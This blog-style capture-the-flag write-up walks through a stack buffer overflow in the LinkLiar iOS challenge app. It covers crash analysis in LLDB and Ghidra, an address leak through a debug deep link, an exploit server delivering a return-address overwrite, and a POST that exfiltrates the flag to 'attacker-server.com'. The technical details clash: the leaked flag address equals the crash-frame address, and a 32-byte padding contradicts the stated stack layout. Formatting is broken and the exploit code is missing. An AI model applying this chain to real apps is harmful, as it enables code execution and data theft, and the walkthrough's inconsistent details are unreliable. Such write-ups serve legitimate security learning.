---
title: "LinkLiar iOS Challenge: Buffer Overflow Deep Dive"
description: "Walkthrough of solving the LinkLiar buffer overflow challenge using LLDB, Ghidra, and Burp"
pubDate: 2026-03-28
tags: ["iOS", "reverse-engineering", "buffer-overflow", "lldb", "ghidra", "exploit-development"]
---

Yoo Folks! Long Time.

I was learning iOS reverse engineering lately, and I came across the LinkLiar Challenges. I was working on this challenge for a long time. I was completely lost and frustrated. The challenge itself says it's bufferoverflow still not able to find it. Let me break out to you how I solve this.

**Tools used:**
- LLDB
- Ghidra
- Burp

## Walkthrough of the application

Simple app with a scan URL option that scans the URL you provide.

![App interface](images/linkliar-app.png)

And there is a debug Mode which is greyed out.

Let's pass URLs http://example.com and http://google.com

![Google URL crash](images/google-crash.png)

While passing the Google URL APP crashed. That seems interesting.

## Debugging

Since a crash occured lets dig into this. LLDB is the right tool to do the same. Lets spinup the server and client

![LLDB server](images/lldb-server.png)
![LLDB client](images/lldb-client.png)

Let's trigger the crash again.

![Crash trigger](images/crash-trigger.png)
![Crash backtrace](images/crash-backtrace.png)

Let's backtrace the crash
//lldb bt image


We got a few frames. Let's Look into frame #1: 0x00000001008b6ddc Linkliar`-[ViewController parseHTTPHeaders:] + 380

Open the Linkliar binary in Ghidra. Let search parseHTTPHeaders in the symbol Tree.

![Ghidra symbol tree](images/ghidra-symbols.png)

We got the function lets review it.

![Ghidra decompilation 1](images/ghidra-decomp1.png)
![Ghidra decompilation 2](images/ghidra-decomp2.png)

### Understanding the Overflow

The programmer mistakenly assumed the stack buffers were contiguous when they're actually separate:

Stack Layout (Actual):
[local_7410: 32 bytes] <- Header 0 name
[acStack_73e8: 255 bytes] <- Header 0 value
[local_72e9: 29305 bytes] <- Additional space

Intended Layout (Assumed):
[Header 0: 296 bytes][Header 1: 296 bytes][Header 2: 296 bytes]


**Consequences:**

- **Header 0**: Safely uses `local_7410` and `acStack_73e8`
- **Header 1**: Writes at offset 296, overwriting `local_72e9`
- **Header 2+**: Continues overwriting beyond buffer boundaries
- **Header 100**: Writes beyond `local_72e9` into the stack canary and return address

### The Flag Function

While analyzing the binary, I discovered a function that constructs a flag that can also be used to exfiltrate the flag:

![Flag function](images/flag-function.png)

## Finding the Exploitation Vector

The challenge required calling `_flag()` through the buffer overflow. However, I needed:

1. The address of `_flag()` in memory
2. A way to receive the flag POST request

### Deep Link Discovery

Examining `Info.plist` revealed custom URL schemes:

```xml
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>linkliar</string>
        </array>
    </dict>
</array>

https://images/infoplist.png

This indicated the app could handle linkliar:// URLs. Further analysis showed that opening linkliar://debug?url=http://[server] would set the debug URL in NSUserDefaults. This deeplink allowus to enable the debug mode in the application.

https://images/debug-mode.png
https://images/debug-active.png

Crafting the Exploit
Calculating the Payload Offset
If you know ASLR, then you know it's not easy to access the function directly by providing the static address from Ghidra. Here, we have a bonus from the deeplink. While accessing the debug deeplink, the application is sending us a debug report over a POST request with a set of runtime addresses.

https://images/debug-report.png

Luckily, the 2nd address is the actual address of the flag function. Now lets develope the payload

https://images/payload-calc.png

Exploit code

Exploit code explanation
Store the address received in the post request into an array(debug_addrs[]). Store the 2nd address into flag_addr and convert it to little-endian. Create padding with 32bytes of A. Payload: add the padding + the flag address converted to little-endian. Send the payload in the response.

The Exploit Chain

Start exploit server —> open deeplink in iPhone—> Scan the exploit URL(Exploit Delivery) —> Flag Exfiltration.

text
[+] Exploit server running on port 8080
[+] External IP: Use your local IP address
[+] Step 1: Open linkliar://debug?url=http://[YOUR_IP]:8080
[+] Step 2: Scan URL http://[YOUR_IP]:8080/exploit
[+] Debug report received. Addresses: [0x1008b6ddc, 0x1008b6ddc]
[+] Sending exploit payload with flag address: 0x1008b6ddc
[+] Exploit payload delivered to 192.168.1.100:54321
Flag Exfiltration
After the exploit chain completes, the flag is sent back to the server:

json
POST /flag HTTP/1.1
Host: attacker-server.com
Content-Type: application/json

{
    "flag": "LINKLIAR{1f_y0u_kn0w_y0u_kn0w_1f_y0u_d0n7_y0u_d0n7}",
    "timestamp": "2026-03-28T12:34:56Z"
}

Happy hacking! 🚀